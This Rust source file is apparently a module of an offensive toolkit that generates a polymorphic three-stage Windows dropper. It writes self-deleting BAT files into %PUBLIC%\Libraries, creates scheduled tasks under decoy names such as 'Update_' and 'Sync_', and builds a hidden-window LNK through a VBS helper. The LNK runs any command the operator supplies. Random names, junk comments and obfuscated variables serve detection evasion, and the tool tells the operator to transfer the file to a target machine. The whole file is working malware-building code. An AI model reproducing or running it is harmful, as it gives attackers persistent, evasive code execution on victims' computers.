use anyhow::{Result, Context};
use colored::*;
use crate::utils::validate_file_path;
use rand::{rng, Rng, prelude::IndexedRandom};
use std::fs;
use std::io::Write;
use std::fmt::Write as FmtWrite;

/// Polymorph 3-Stage Dropper
///
/// Generates a 3-stage payload chain to evade detection and persistence via Task Scheduler.
///
/// Flow:
/// 1. Dropper BAT (random name) -> Writes Stage 2 BAT + Schedules it
/// 2. Stage 2 BAT (random name) -> Writes VBS -> Creates LNK -> Schedules LNK
/// 3. Stage 3 LNK (random name) -> Executes final command
///
/// Features:
/// - Polymorphic variable names
/// - Random filenames
/// - Configurable delays (minutes/days)
/// - Non-root directory usage (%PUBLIC%\Libraries usually writable)

pub async fn run(_target: &str) -> Result<()> {
    println!("{}", "=== Polymorph 3-Stage Dropper ===".cyan().bold());
    println!("{}", "Generates a 3-stage payload chain using Task Scheduler for persistence/evasion.".yellow());

    // 1. Get User Input
    let command = prompt("[+] Final Command to Execute (e.g., calc.exe, powershell ...): ").await?;
    let stage1_delay_str = prompt("[+] Stage 1 Delay (e.g., 1m, 2d): ").await?;
    let stage2_delay_str = prompt("[+] Stage 2 Delay (e.g., 5m, 1d): ").await?;
    let output_name = prompt("[+] Output Dropper Filename (e.g., dropper.bat): ").await?;

    // Validate inputs
    validate_file_path(&output_name, true)?;
    
    // Parse delays
    let delay1_mins = parse_delay(&stage1_delay_str)?;
    let delay2_mins = parse_delay(&stage2_delay_str)?;

    // Generate Random Names
    let dropper_name = output_name.clone();
    let stage2_bat_name = format!("{}.bat", random_string(8));
    let stage3_lnk_name = format!("{}.lnk", random_string(8));
    let vbs_helper_name = format!("{}.vbs", random_string(8));
    
    // Task Names
    let task1_name = format!("Update_{}", random_string(6));
    let task2_name = format!("Sync_{}", random_string(6));

    // Polymorphic Variables for obfuscation
    let var_cmd = random_var();
    let var_p1 = random_var();
    
    println!();
    println!("{}", "[*] Generating payload chain...".blue());
    println!("    Stage 1: {} (Dropper) -> Task: {}", dropper_name, task1_name);
    println!("    Stage 2: {} (Payload Gen) -> Task: {}", stage2_bat_name, task2_name);
    println!("    Stage 3: {} (LNK Trigger) -> Command: {}", stage3_lnk_name, command);
    println!("    Obfuscation vars: {}, {}", var_cmd, var_p1);

    // --- GENERATE STAGE 2 CONTENT (The BAT that creates LNK) ---
    // This BAT will be embedded inside Stage 1
    // It needs to:
    // 1. Create a VBS script
    // 2. Run VBS to create LNK
    // 3. Schedule the LNK
    
    // Escape command for BAT/VBS/LNK nesting... this is tricky.
    // LNK Target: cmd.exe
    // LNK Args: /c start "" "command" (to hide window if possible) or just /c command
    let lnk_target = "cmd.exe";
    let lnk_args = format!("/c {}", command);
    
    // We write a VBS script to generate the LNK because it is more reliable than pure BAT for LNKs
    let vbs_content = format!(
        r#"Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "{stage3_lnk_name}"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "{lnk_target}"
oLink.Arguments = "{lnk_args}"
oLink.WindowStyle = 7
oLink.Save"#,
        stage3_lnk_name = stage3_lnk_name,
        lnk_target = lnk_target,
        lnk_args = lnk_args.replace("\"", "\"\"") // VBS string escaping
    );

    // Stage 2 BAT Content
    // Be careful with escaping, this string will be echo'd by Stage 1 into a file
    let task2_cmd = format!("cmd /c start /min \"\" \"%cd%\\{}\"", stage3_lnk_name);
    
    // We inject the time calculation logic into Stage 2
    let time_calc_loop = format!(
        r#"for /f "usebackq delims=" %%T in (`powershell -Command "get-date (get-date).addMinutes({}) -Format HH:mm"`) do set "FUTURE_TIME=%%T""#,
        delay2_mins
    );

    let stage2_content_raw = format!(
        r#"@echo off
cd /d "%~dp0"
echo Creating shortcut helper...
(
{vbs_echo_lines}
) > "{vbs_name}"

cscript //nologo "{vbs_name}"
del "{vbs_name}" >nul 2>&1

echo Scheduling final trigger...
{time_calc_loop}
schtasks /create /sc ONCE /st %FUTURE_TIME% /tn "{task_name}" /tr "{task_cmd}" /f >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Task creation failed. Admin rights might be needed or schedule time invalid.
    echo [*] Fallback: Executing LNK immediately...
    start "" "{lnk_name}"
)
del "%~f0" >nul 2>&1
"#,
        vbs_echo_lines = vbs_content.lines().map(|l| format!("echo {}", l)).collect::<Vec<_>>().join("\n"),
        vbs_name = vbs_helper_name,
        time_calc_loop = time_calc_loop,
        task_name = task2_name,
        task_cmd = task2_cmd, // The command the task executes (run the LNK)
        lnk_name = stage3_lnk_name
    );


    // --- GENERATE STAGE 1 CONTENT (The Dropper) ---
    // Writes Stage 2 to a hidden/writable directory and schedules it.
    // Target Dir: %PUBLIC%\Libraries (often writable and less checked than Temp)
    let target_dir = "%PUBLIC%\\Libraries"; 
    
    // Escaping Stage 2 content to be echo'd by Stage 1
    // We need to escape special BAT chars like %, >, <, |, &
    let stage2_escaped = escape_bat_echo(&stage2_content_raw);

    let stage1_content = format!(
        r#"@echo off
setlocal EnableDelayedExpansion
:: Polymorphic Junk
{junk_comments}
set "{v_dir}={target_dir}"
if not exist "!{v_dir}!" mkdir "!{v_dir}!"
cd /d "!{v_dir}!"

echo [*] Dropping Stage 2...
(
{stage2_lines}
) > "{stage2_file}"

echo [*] Scheduling Stage 2...
:: Calculate time {delay1} mins in future using PowerShell
for /f "usebackq delims=" %%T in (`powershell -Command "get-date (get-date).addMinutes({delay1}) -Format HH:mm"`) do set "FUTURE_TIME=%%T"

schtasks /create /sc ONCE /st !FUTURE_TIME! /tn "{task1_name}" /tr "cmd /c start /min \"\" \"!{v_dir}!\{stage2_file}\"" /f

echo [+] Dropper complete. Payload chain initiated.
timeout /t 3 >nul
del "%~f0" >nul 2>&1
"#,
        junk_comments = generate_junk_comments(),
        v_dir = random_var(), // Polymorphic variable for dir
        target_dir = target_dir,
        stage2_lines = stage2_escaped,
        stage2_file = stage2_bat_name,
        delay1 = delay1_mins,
        task1_name = task1_name
    );

    // Write Dropper
    fs::write(&dropper_name, stage1_content)
        .with_context(|| format!("Failed to write dropper to {}", dropper_name))?;

    println!("{}", format!("[+] Dropper written to: {}", dropper_name).green().bold());
    println!("[*] Transfer this file to the target Windows machine.");
    println!("[*] Note: The payload relies on 'schtasks' and 'powershell' (for time calc) being available.");

    Ok(())
}

// Helpers

async fn prompt(text: &str) -> Result<String> {
    print!("{}", text.cyan());
    std::io::stdout().flush()?;
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(buf.trim().to_string())
}

fn parse_delay(input: &str) -> Result<u32> {
    let lower = input.to_lowercase();
    if let Some(mins) = lower.strip_suffix('m') {
        mins.parse().context("Invalid minutes format")
    } else if let Some(days) = lower.strip_suffix('d') {
        let d: u32 = days.parse().context("Invalid days format")?;
        Ok(d * 1440)
    } else {
        // Default to minutes if no suffix
        input.parse().context("Invalid delay format (use '10m' or '2d')")
    }
}

fn random_string(len: usize) -> String {
    let charset = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let mut rng = rng();
    (0..len).map(|_| *charset.choose(&mut rng).unwrap_or(&b'A') as char).collect()
}

fn random_var() -> String {
    let charset = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let mut rng = rng();
    let len = rng.random_range(4..8);
    (0..len).map(|_| *charset.choose(&mut rng).unwrap_or(&b'A') as char).collect()
}

fn generate_junk_comments() -> String {
    let mut rng = rng();
    let count = rng.random_range(3..7);
    let mut s = String::new();
    for _ in 0..count {
        writeln!(s, ":: {}", random_string(20)).ok();
    }
    s
}

fn escape_bat_echo(content: &str) -> String {
    content.lines().map(|line| {
        // Escape special chars for echo
        let escaped = line.replace("%", "%%")
                          .replace("^", "^^")
                          .replace("&", "^&")
                          .replace("<", "^<")
                          .replace(">", "^>")
                          .replace("|", "^|")
                          .replace("(", "^(")
                          .replace(")", "^)");
        format!("echo {}", escaped)
    }).collect::<Vec<_>>().join("\n")
}
